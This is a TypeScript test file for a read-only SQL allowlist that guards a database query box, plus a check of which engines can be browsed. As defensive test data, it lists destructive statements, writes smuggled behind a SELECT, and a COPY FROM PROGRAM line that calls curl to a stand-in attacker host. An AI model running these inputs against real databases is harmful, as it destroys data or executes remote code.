import { describe, expect, test } from 'bun:test';
import { canBrowse, isReadOnly } from '../src/catalog/browse.ts';

/**
 * Looking inside a database, and the one rule that keeps it safe.
 *
 * The query box runs whatever it is given against a real database, so what it will
 * and will not accept is the whole of the security of this feature. It is an
 * allowlist of first words rather than a search for dangerous ones, because a
 * denylist is a guess about every way somebody could write `DROP` and being wrong
 * once means losing a database.
 */

describe('what counts as a read', () => {
  test('accepts the statements that only look', () => {
    for (const sql of [
      'SELECT * FROM users',
      'select id, name from users where id = 1',
      '  SELECT 1  ',
      'SHOW TABLES',
      'DESCRIBE users',
      'EXPLAIN SELECT * FROM users',
      'WITH recent AS (SELECT * FROM orders) SELECT * FROM recent',
      '(SELECT * FROM users)',
      'SELECT * FROM users;',
    ]) {
      expect(isReadOnly(sql)).toBe(true);
    }
  });

  test('refuses anything that writes', () => {
    for (const sql of [
      'DROP TABLE users',
      'DELETE FROM users',
      'UPDATE users SET admin = true',
      'INSERT INTO users VALUES (1)',
      'TRUNCATE users',
      'ALTER TABLE users ADD COLUMN x INT',
      'CREATE TABLE x (id INT)',
      'GRANT ALL ON users TO public',
      "COPY users FROM PROGRAM 'curl evil.test'",
    ]) {
      expect(isReadOnly(sql)).toBe(false);
    }
  });

  test('refuses a write smuggled in behind a read', () => {
    // The classic. A trailing semicolon is fine; a second statement is not, however
    // innocent the first one looks.
    for (const sql of [
      'SELECT 1; DROP TABLE users',
      'SELECT 1 ; DELETE FROM users',
      'SELECT 1;\nUPDATE users SET admin = true',
      'select * from users; truncate users;',
    ]) {
      expect(isReadOnly(sql)).toBe(false);
    }
  });

  test('refuses things that merely contain the word select', () => {
    expect(isReadOnly('DELETE FROM users WHERE id IN (SELECT id FROM banned)')).toBe(false);
    expect(isReadOnly('-- SELECT\nDROP TABLE users')).toBe(false);
  });

  test('refuses nothing at all', () => {
    expect(isReadOnly('')).toBe(false);
    expect(isReadOnly('   ')).toBe(false);
  });
});

describe('which engines can be browsed', () => {
  test('the ones that have tables', () => {
    expect(canBrowse('postgres')).toBe(true);
    expect(canBrowse('mysql')).toBe(true);
    expect(canBrowse('mariadb')).toBe(true);
  });

  test('and not the ones that do not', () => {
    // Redis and Mongo are not tables. Pretending otherwise would be a worse screen
    // than sending somebody to the Terminal tab.
    expect(canBrowse('redis')).toBe(false);
    expect(canBrowse('valkey')).toBe(false);
    expect(canBrowse('mongodb')).toBe(false);
    expect(canBrowse(null)).toBe(false);
  });
});
